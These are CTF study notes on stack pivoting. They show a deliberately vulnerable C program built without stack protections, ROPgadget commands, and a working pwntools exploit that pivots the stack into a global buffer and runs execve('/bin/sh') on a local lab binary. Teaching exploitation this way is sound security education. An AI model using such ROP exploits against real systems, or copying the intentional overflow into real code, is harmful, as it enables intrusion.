# Simple PWN - 0x09(stack pivoting)
###### tags: `CTF` `PWN` `eductf`

## Stack Pivoting background
[NTUSTISC - Pwn Basic 3 [2019.03.26]](https://youtu.be/iA4Hrr17ooI?t=6865)
[Pwn week1](https://youtu.be/ktoVQB99Gj4?t=7898)
It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed.
More detailed info. can refer to [Binary Exploitation (Pwn)](https://youtu.be/5D7tvxpSUUM?t=9543)


## Original Code
```cpp!
#include <stdio.h>
#include <unistd.h>

char name[0x80]

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char s[0x10];

    printf("Give me your name: ");
    read(0, name, 0x80);

    printf("Give me your ROP: ");
    read(0, s, 0x20);

    return 0;
}
```
* You can observe that it has not much stack buffer overflow can use, but it has global variable `name` with space `0x80`(can be another stack)
    ```bash!
    gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static
    ```
* <font color="FF0000">Note that</font>:
must use `mprotect` to change permission of global variable `name` just like [lecture 0x04](https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJhgXGKci), add these line in original code
    ```c!
    #include <sys/mman.h>
    mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC);
    ```
    **Before `mprotect` - `vmmap`**
    ![](https://imgur.com/z8cK5SM.png)
    ![](https://imgur.com/J6qKJ8N.png)
    **After `mprotect` - `vmmap`**
    ![](https://imgur.com/gNr8Fya.png)

## Exploit
1. Construct `ROP` chain
    ```bash!
    objdump -d -M Intel stack_pivoting | grep "<name>"
    ROPgadget --binary stack_pivoting --only "pop|ret|syscall|leave" > one_gadget
    vim one_gadget
    ```
    ![](https://imgur.com/TYmCYw4.png)
    ![](https://imgur.com/o5L0Uvu.png)
    ![](https://imgur.com/OU9yJU4.png)
    ![](https://imgur.com/tWcfPEN.png)
    ![](https://imgur.com/ix4Phxm.png)
    ![](https://imgur.com/aZN3iu8.png)
    
2. Find address of variable `name`
    ```bash!
    objdump -d -M Intel stack_pivoting | grep "<name>"
    ```
    ![](https://imgur.com/l6OIT2S.png)
3. Whole exploit
    :::spoiler Code
    ```python!=
    from pwn import *

    context.arch = 'amd64'

    r = process('./stack_pivoting')
    raw_input()
    name = 0x4c70c0
    leave_ret = 0x40182d
    pop_rdi_ret = 0x401ecf
    pop_rsi_ret = 0x409efe
    pop_rax_ret = 0x44fd07
    pop_rdx_rbx_ret = 0x485b2b
    syscall = 0x401c84

    ROP = b'/bin/sh\x00'
    ROP += flat(
        pop_rdi_ret, name,
        pop_rsi_ret, 0,
        pop_rdx_rbx_ret, 0, 0,
        pop_rax_ret, 0x3b,
        syscall
    )

    r.sendafter("Give me your name: ", ROP)
    raw_input()
    r.sendafter("Give me your ROP: ", b'a'*0x10 + p64(name) + p64(leave_ret))

    r.interactive()
    ```
    :::
    * First, write `ROP` chain to global variable `name`
    * Next, use 2 `leave ; ret` to pivot `name` as a stack
4. Finally, you got shell!!!
    ![](https://imgur.com/kCyVi4N.png)

## Reference
[mprotect.2 man](https://man7.org/linux/man-pages/man2/mprotect.2.html)
[trace 30個基本Linux系統呼叫第二十二日：mprotect](https://ithelp.ithome.com.tw/articles/10187093)